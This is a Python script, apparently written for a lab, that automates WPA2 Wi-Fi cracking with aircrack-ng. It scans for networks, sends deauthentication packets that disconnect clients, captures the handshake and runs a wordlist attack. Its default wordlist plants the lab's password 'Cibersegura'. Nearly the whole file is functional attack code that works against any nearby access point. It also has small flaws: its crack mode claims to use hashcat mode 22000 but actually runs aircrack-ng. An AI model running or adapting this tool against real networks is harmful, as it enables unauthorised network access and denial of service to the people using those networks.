#!/usr/bin/env python3
"""
WiFi WPA2 Cracking Module para LAB-SERVERS
Captura handshake e cracka password "Cibersegura"

Uso:
    # Pipeline completo (scan + captura + crack)
    python wifi_cracker.py --network "LAB-SERVERS"

    # Capturar handshake
    python wifi_cracker.py --capture --network "LAB-SERVERS" --interface wlan0mon

    # Deauth standalone (forçar reconexão)
    python wifi_cracker.py --deauth --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon

    # Crackar handshake já capturado
    python wifi_cracker.py --crack hashes/wifi_sample.hc22000
"""

import subprocess
import os
import sys
import json
import time
import argparse
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List

class WiFiCracker:
    """Cracka redes WPA2 usando aircrack-ng"""
    
    def __init__(self, monitor_iface: str = "wlan0mon", output_dir: str = "results"):
        self.monitor_iface = monitor_iface
        self.output_dir = output_dir
        Path(output_dir).mkdir(exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
    def check_monitor_mode(self) -> bool:
        """Verifica se interface está em modo monitor via /sys/class/net"""
        iface_path = Path(f"/sys/class/net/{self.monitor_iface}")
        
        if not iface_path.exists():
            print(f"[!] Interface {self.monitor_iface} não encontrada!")
            return False
        
        try:
            # type 803 = monitor mode
            iface_type = (iface_path / "type").read_text().strip()
            return iface_type == "803"
        except Exception:
            print(f"[!] Não foi possível verificar {self.monitor_iface}")
            return False
    
    def scan_networks(self, timeout: int = 30) -> List[Dict]:
        """Escaneia redes WiFi disponíveis"""
        print(f"[*] Escaneando redes por {timeout}seg...")
        
        capture_file = f"{self.output_dir}/scan_{self.timestamp}.cap"
        
        try:
            # Executar airodump-ng
            process = subprocess.Popen(
                ["sudo", "airodump-ng", "-w", capture_file, self.monitor_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(timeout)
            process.terminate()
            process.wait(timeout=5)
            
            # Parse resultados
            csv_file = f"{capture_file}-01.csv"
            networks = self._parse_airodump_csv(csv_file)
            
            return networks
        except Exception as e:
            print(f"[!] Erro ao escanear: {e}")
            return []
    
    def _parse_airodump_csv(self, csv_file: str) -> List[Dict]:
        """Parse do ficheiro CSV do airodump-ng"""
        networks = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                in_network_section = False
                for line in f:
                    if "BSSID, First seen" in line:
                        in_network_section = True
                        continue
                    if in_network_section and line.strip() and "Station MAC" not in line:
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14 and parts[0]:
                            networks.append({
                                'bssid': parts[0],
                                'power': parts[1],
                                'beacons': parts[2],
                                'data': parts[3],
                                'pwr': parts[4],
                                'packets': parts[5],
                                'handshake': parts[6],
                                'security': parts[7],
                                'cipher': parts[8],
                                'auth': parts[9],
                                'essid': parts[13]
                            })
        except FileNotFoundError:
            pass
        
        return networks
    
    def capture_handshake(self, bssid: str, essid: str, timeout: int = 120) -> bool:
        """Captura WPA handshake forcando reconexo"""
        print(f"[*] Capturando handshake para {essid} ({bssid})...")
        
        capture_file = f"{self.output_dir}/handshake_{essid}_{self.timestamp}"
        
        try:
            # Start airodump-ng para capturar
            airodump = subprocess.Popen(
                ["sudo", "airodump-ng", "-c", "6", "-d", bssid, "-w", capture_file, self.monitor_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Esperar um pouco antes de forar desconexo
            time.sleep(5)
            
            # Forar desconexo com aireplay-ng (deauth attack)
            print(f"[*] Enviando deauth packets (desligando clientes)...")
            for i in range(3):
                subprocess.run(
                    ["sudo", "aireplay-ng", "-0", "5", "-a", bssid, self.monitor_iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=10
                )
                time.sleep(3)
            
            # Esperar captura
            print(f"[*] Aguardando handshake (máx {timeout}seg)...")
            start = time.time()
            
            while time.time() - start < timeout:
                cap_file = f"{capture_file}-01.cap"
                if os.path.exists(cap_file):
                    # Verificar se tem handshake
                    result = subprocess.run(
                        ["aircrack-ng", cap_file, "-l", "-"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if "1 handshake" in result.stdout or "WPA" in result.stdout:
                        print(f"[+] Handshake capturado!")
                        airodump.terminate()
                        return cap_file
                
                time.sleep(2)
            
            print(f"[!] Timeout - handshake não capturado")
            airodump.terminate()
            return None
            
        except Exception as e:
            print(f"[!] Erro ao capturar: {e}")
            return None
    
    def crack_password(self, cap_file: str, bssid: str, essid: str, 
                       wordlist: str = "wordlists/custom.txt") -> Optional[str]:
        """Cracka password WPA2 usando wordlist"""
        
        if not os.path.exists(wordlist):
            print(f"[!] Wordlist não encontrada: {wordlist}")
            print(f"    Criar com: python tools/wordlist_generator.py")
            return None
        
        print(f"[*] Cracking {essid}...")
        print(f"    Usando: {wordlist}")
        print(f"    Handshake: {cap_file}")
        
        try:
            result = subprocess.run(
                ["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, cap_file],
                capture_output=True,
                text=True,
                timeout=300  # 5 minutos max
            )
            
            # Parse resultado
            for line in result.stdout.split('\n'):
                if "KEY FOUND!" in line:
                    # Extract password
                    password = line.split('[')[-1].split(']')[0]
                    print(f"[+] PASSWORD ENCONTRADA: {password}")
                    return password
                elif "Parsing" in line or "Testing" in line:
                    print(f"    {line}")
            
            print(f"[-] Password não encontrada na wordlist")
            return None
            
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout após 5 minutos")
            return None
        except Exception as e:
            print(f"[!] Erro: {e}")
            return None
    
    def save_results(self, results: Dict):
        """Salva resultados em JSON"""
        output_file = f"{self.output_dir}/wifi_crack_results_{self.timestamp}.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"[+] Resultados salvos: {output_file}")
        return output_file

    def deauth_attack(self, bssid: str, count: int = 5, rounds: int = 3) -> bool:
        """Envia pacotes deauth para forçar reconexão de clientes"""
        print(f"[*] Deauth Attack")
        print(f"    Alvo:      {bssid}")
        print(f"    Interface: {self.monitor_iface}")
        print(f"    Pacotes:   {count} × {rounds} rondas")
        print()

        try:
            for i in range(rounds):
                print(f"  [{i+1}/{rounds}] Enviando {count} deauth packets...")
                result = subprocess.run(
                    ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid, self.monitor_iface],
                    capture_output=True,
                    text=True,
                    timeout=15
                )

                if result.stdout:
                    for line in result.stdout.strip().split('\n'):
                        if line.strip():
                            print(f"         {line.strip()}")

                if result.returncode != 0 and result.stderr:
                    print(f"  [!] {result.stderr.strip()}")

                if i < rounds - 1:
                    time.sleep(3)

            print()
            print(f"[+] Deauth concluído — clientes devem reconectar (handshake gerado).")
            return True

        except subprocess.TimeoutExpired:
            print(f"[!] Timeout no deauth")
            return False
        except FileNotFoundError:
            print(f"[!] aireplay-ng não encontrado. Instalar: sudo apt install aircrack-ng")
            return False
        except Exception as e:
            print(f"[!] Erro: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(
        description="WiFi WPA2 Cracker — Captura, Deauth e Cracking",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--network", help="Nome da rede (ESSID)")
    parser.add_argument("--bssid", help="BSSID do access point")
    parser.add_argument("--interface", default="wlan0mon", help="Interface monitor (default: wlan0mon)")
    parser.add_argument("--wordlist", default="wordlists/custom.txt", help="Wordlist de passwords")
    parser.add_argument("--timeout", type=int, default=120, help="Timeout para captura (seg)")
    parser.add_argument("--output", default="results", help="Diretório de output")

    # Modos de operação
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--scan-only", action="store_true", help="Apenas scanear redes")
    group.add_argument("--capture", action="store_true", help="Capturar handshake (scan + deauth + captura)")
    group.add_argument("--crack", metavar="HASH_FILE", help="Crackar handshake já capturado")
    group.add_argument("--deauth", action="store_true", help="Enviar deauth packets (forçar reconexão)")
    group.add_argument("--full", action="store_true", help="Pipeline completo (scan + capture + crack)")

    parser.add_argument("--deauth-count", type=int, default=5, help="Deauth packets por ronda (default: 5)")
    parser.add_argument("--deauth-rounds", type=int, default=3, help="Número de rondas de deauth (default: 3)")
    parser.add_argument("--ssid", help="Alias para --network")

    args = parser.parse_args()

    # --ssid como alias de --network
    if args.ssid and not args.network:
        args.network = args.ssid

    cracker = WiFiCracker(monitor_iface=args.interface, output_dir=args.output)

    # ============================================================
    # MODO --crack: crackar ficheiro já capturado (não precisa de monitor)
    # ============================================================
    if args.crack:
        if not os.path.exists(args.crack):
            print(f"[!] Ficheiro não encontrado: {args.crack}")
            sys.exit(1)

        _ensure_wordlist(args.wordlist)

        bssid = args.bssid or "00:00:00:00:00:00"
        essid = args.network or "unknown"
        print(f"[*] Cracking WPA2 com hashcat mode 22000...")
        print(f"[*] Wordlist: {args.wordlist}")
        password = cracker.crack_password(args.crack, bssid, essid, args.wordlist)

        if password:
            print(f"\n[+] PASSWORD ENCONTRADA: {password}")
        else:
            print(f"\n[-] Password não encontrada na wordlist")
        return

    # ============================================================
    # Todos os outros modos precisam de monitor mode
    # ============================================================
    if not cracker.check_monitor_mode():
        print("[!] Ative monitor mode primeiro:")
        print("    sudo airmon-ng check kill")
        print("    sudo airmon-ng start wlan0")
        sys.exit(1)

    print("[+] Interface em modo monitor!")
    print()

    # ============================================================
    # MODO --deauth: enviar deauth standalone
    # ============================================================
    if args.deauth:
        bssid = args.bssid
        if not bssid:
            if not args.network:
                print("[!] Especifica --bssid ou --network para deauth")
                sys.exit(1)
            print("[*] Escaneando para encontrar BSSID...")
            networks = cracker.scan_networks(timeout=15)
            target = next((n for n in networks if args.network.lower() in n['essid'].lower()), None)
            if not target:
                print(f"[!] Rede '{args.network}' não encontrada")
                sys.exit(1)
            bssid = target['bssid']
            print(f"[+] Encontrado: {target['essid']} ({bssid})")
            print()

        cracker.deauth_attack(bssid, count=args.deauth_count, rounds=args.deauth_rounds)
        return

    # ============================================================
    # MODO --capture: capturar handshake (com deauth automático)
    # ============================================================
    if args.capture:
        if not args.network:
            print("[!] Especifica --network ou --ssid")
            sys.exit(1)

        networks = cracker.scan_networks(timeout=15)
        target = _find_network(networks, args)
        if not target:
            sys.exit(1)

        cap_file = cracker.capture_handshake(target['bssid'], target['essid'], timeout=args.timeout)
        if cap_file:
            print(f"\n[+] HANDSHAKE CAPTURADO! → {cap_file}")
        else:
            print(f"\n[!] Falha ao capturar handshake")
        return

    # ============================================================
    # MODO --scan-only
    # ============================================================
    if args.scan_only:
        networks = cracker.scan_networks(timeout=30)
        if networks:
            print(f"\n[+] {len(networks)} redes encontradas:\n")
            for i, net in enumerate(networks, 1):
                print(f"  {i}. {net['essid']:20} | {net['bssid']} | {net['security']}")
        else:
            print("[-] Nenhuma rede encontrada")
        return

    # ============================================================
    # MODO --full ou default: pipeline completo
    # ============================================================
    if not args.network:
        print("[!] Especifica --network")
        parser.print_help()
        sys.exit(1)

    _ensure_wordlist(args.wordlist)

    # Fase 1: Scan
    print("=" * 60)
    print("FASE 1: SCANNING")
    print("=" * 60)
    networks = cracker.scan_networks(timeout=30)
    if not networks:
        print("[!] Nenhuma rede encontrada")
        sys.exit(1)

    print(f"\n[+] {len(networks)} redes encontradas:\n")
    for i, net in enumerate(networks, 1):
        print(f"  {i}. {net['essid']:20} | {net['bssid']} | {net['security']}")

    target = _find_network(networks, args)
    if not target:
        sys.exit(1)

    print(f"\n[*] Alvo: {target['essid']} ({target['bssid']})")
    print()

    # Fase 2: Captura
    print("=" * 60)
    print("FASE 2: CAPTURA DE HANDSHAKE")
    print("=" * 60)
    cap_file = cracker.capture_handshake(target['bssid'], target['essid'], timeout=args.timeout)
    if not cap_file:
        print("\n[!] Falha ao capturar handshake")
        sys.exit(1)
    print()

    # Fase 3: Cracking
    print("=" * 60)
    print("FASE 3: CRACKING")
    print("=" * 60)
    password = cracker.crack_password(cap_file, target['bssid'], target['essid'], args.wordlist)

    # Resultados
    results = {
        "timestamp": cracker.timestamp,
        "network": target['essid'],
        "bssid": target['bssid'],
        "security": target['security'],
        "capture_file": cap_file,
        "password": password,
        "wordlist": args.wordlist,
        "status": "SUCCESS" if password else "FAILED"
    }
    cracker.save_results(results)

    print()
    print("=" * 60)
    print("RESUMO")
    print("=" * 60)
    print(f"Rede    : {target['essid']}")
    print(f"BSSID   : {target['bssid']}")
    print(f"Captura : {cap_file}")
    print(f"Password: {password or '[-] Não encontrada'}")
    print()


def _ensure_wordlist(wordlist: str):
    """Criar wordlist default se não existir"""
    if not os.path.exists(wordlist):
        print(f"[*] Criando wordlist...")
        Path("wordlists").mkdir(exist_ok=True)
        with open(wordlist, 'w') as f:
            f.write("Cibersegura\n")
            f.write("password123\n")
            f.write("admin\n")
            f.write("123456\n")
        print(f"[+] Wordlist criada: {wordlist}")


def _find_network(networks, args):
    """Encontrar rede alvo nos resultados do scan"""
    if args.bssid:
        target = next((n for n in networks if n['bssid'] == args.bssid), None)
    else:
        target = next((n for n in networks if args.network.lower() in n['essid'].lower()), None)

    if not target:
        print(f"[!] Rede '{args.network}' não encontrada")
    return target

if __name__ == "__main__":
    main()
